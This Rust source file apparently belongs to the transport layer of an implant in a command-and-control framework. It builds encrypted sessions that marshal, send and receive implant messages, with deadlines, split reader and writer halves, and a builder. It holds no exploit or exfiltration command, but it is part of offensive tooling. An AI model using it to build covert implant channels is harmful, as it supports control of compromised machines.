use std::time::Duration;

use futures::{join, FutureExt};
use futures_timer::Delay;

use malefic_proto::marshal;
use malefic_proto::proto::implantpb::Spites;

use crate::session::{Session, SessionConfig, SessionReader, SessionWriter};
use crate::{InnerTransport, TransportError};
use malefic_crypto::crypto::Cryptor;

pub struct Connection {
    session: Session<InnerTransport>,
    session_id: [u8; 4],
    encrypt_key: Option<String>,
    decrypt_key: Option<String>,
    deadline: Duration,
}

impl Connection {
    pub fn new(
        transport: InnerTransport,
        cryptor: Cryptor,
        session_id: [u8; 4],
        encrypt_key: Option<&str>,
        decrypt_key: Option<&str>,
        config: SessionConfig,
    ) -> Self {
        let deadline = config.deadline;
        let session = Session::new(transport, cryptor, config);
        Self {
            session,
            session_id,
            encrypt_key: encrypt_key.map(|s| s.to_string()),
            decrypt_key: decrypt_key.map(|s| s.to_string()),
            deadline,
        }
    }

    pub async fn exchange(mut self, spites: Spites) -> Result<Option<Spites>, TransportError> {
        self.session.reset_cryptor();

        let spite_data = marshal(self.session_id, spites, self.encrypt_key.as_deref())
            .map_err(TransportError::ParserError)?;

        let (mut reader, mut writer) = self.session.split();
        let decrypt_key = self.decrypt_key;

        let exchange_task = async {
            let send_task = writer.write(&spite_data).fuse();
            let recv_task = async {
                loop {
                    match reader.read().await {
                        Ok(Some(received_data)) => return Ok(received_data),
                        Ok(None) => continue,
                        Err(e) => return Err(e),
                    }
                }
            }
            .fuse();
            let (recv_result, send_result) = join!(recv_task, send_task);
            let _ = writer.close().await;
            send_result?;

            match recv_result {
                Ok(received_data) => {
                    let spites = received_data
                        .parse(decrypt_key.as_deref())
                        .map_err(TransportError::ParserError)?;
                    Ok(Some(spites))
                }
                Err(e) if e.is_connection_error() => Err(e),
                Err(_) => Ok(None),
            }
        };

        let timeout = Delay::new(self.deadline).fuse();
        let exchange_task_fused = exchange_task.fuse();
        futures::pin_mut!(timeout, exchange_task_fused);

        futures::select! {
            result = exchange_task_fused => result,
            _ = timeout => Err(TransportError::Deadline),
        }
    }

    pub async fn send_only(mut self, spites: Spites) -> Result<(), TransportError> {
        self.session.reset_cryptor();

        let spite_data = marshal(self.session_id, spites, self.encrypt_key.as_deref())
            .map_err(TransportError::ParserError)?;

        let (_reader, mut writer) = self.session.split();
        let send_result = writer.write(&spite_data).await;
        let _ = writer.close().await;
        send_result
    }

    pub fn split(self) -> (ConnectionReader, ConnectionWriter) {
        let (session_reader, session_writer) = self.session.split();
        (
            ConnectionReader {
                session_reader,
                decrypt_key: self.decrypt_key,
            },
            ConnectionWriter {
                session_writer,
                session_id: self.session_id,
                encrypt_key: self.encrypt_key,
            },
        )
    }
}

pub struct ConnectionReader {
    session_reader: SessionReader,
    decrypt_key: Option<String>,
}

impl ConnectionReader {
    pub async fn receive(&mut self) -> Result<Spites, TransportError> {
        loop {
            if let Some(spites) = self.poll().await? {
                return Ok(spites);
            }
        }
    }

    pub(crate) async fn poll(&mut self) -> Result<Option<Spites>, TransportError> {
        let Some(spite_data) = self.session_reader.read().await? else {
            return Ok(None);
        };

        spite_data
            .parse(self.decrypt_key.as_deref())
            .map_err(TransportError::ParserError)
            .map(Some)
    }
}

pub struct ConnectionWriter {
    session_writer: SessionWriter,
    session_id: [u8; 4],
    encrypt_key: Option<String>,
}

impl ConnectionWriter {
    pub async fn send(&mut self, spites: Spites) -> Result<(), TransportError> {
        let spite_data = marshal(self.session_id, spites, self.encrypt_key.as_deref())
            .map_err(TransportError::ParserError)?;
        self.session_writer.write(&spite_data).await
    }
}

pub struct ConnectionBuilder {
    transport: Option<InnerTransport>,
    cryptor: Option<Cryptor>,
    session_id: Option<[u8; 4]>,
    encrypt_key: Option<String>,
    decrypt_key: Option<String>,
    config: SessionConfig,
}

impl ConnectionBuilder {
    pub fn new(transport: InnerTransport) -> Self {
        Self {
            transport: Some(transport),
            cryptor: None,
            session_id: None,
            encrypt_key: None,
            decrypt_key: None,
            config: SessionConfig::default(),
        }
    }

    pub fn with_cryptor(mut self, cryptor: Cryptor) -> Self {
        self.cryptor = Some(cryptor);
        self
    }

    pub fn with_session_id(mut self, session_id: [u8; 4]) -> Self {
        self.session_id = Some(session_id);
        self
    }

    pub fn with_encrypt_key(mut self, key: Option<&str>) -> Self {
        self.encrypt_key = key.map(|s| s.to_string());
        self
    }

    pub fn with_decrypt_key(mut self, key: Option<&str>) -> Self {
        self.decrypt_key = key.map(|s| s.to_string());
        self
    }

    pub fn with_config(mut self, config: SessionConfig) -> Self {
        self.config = config;
        self
    }

    pub fn build(self) -> Result<Connection, BuildError> {
        let transport = self.transport.ok_or(BuildError::MissingTransport)?;
        let cryptor = self.cryptor.ok_or(BuildError::MissingCryptor)?;
        let session_id = self.session_id.ok_or(BuildError::MissingSessionId)?;
        Ok(Connection::new(
            transport,
            cryptor,
            session_id,
            self.encrypt_key.as_deref(),
            self.decrypt_key.as_deref(),
            self.config,
        ))
    }
}

#[derive(Debug, thiserror::Error)]
pub enum BuildError {
    #[error("Missing transport")]
    MissingTransport,
    #[error("Missing cryptor")]
    MissingCryptor,
    #[error("Missing session ID")]
    MissingSessionId,
}

#[allow(dead_code)]
pub fn create_connection(
    transport: InnerTransport,
    cryptor: Cryptor,
    session_id: [u8; 4],
    encrypt_key: Option<&str>,
    decrypt_key: Option<&str>,
) -> Connection {
    Connection::new(
        transport,
        cryptor,
        session_id,
        encrypt_key,
        decrypt_key,
        SessionConfig::default(),
    )
}
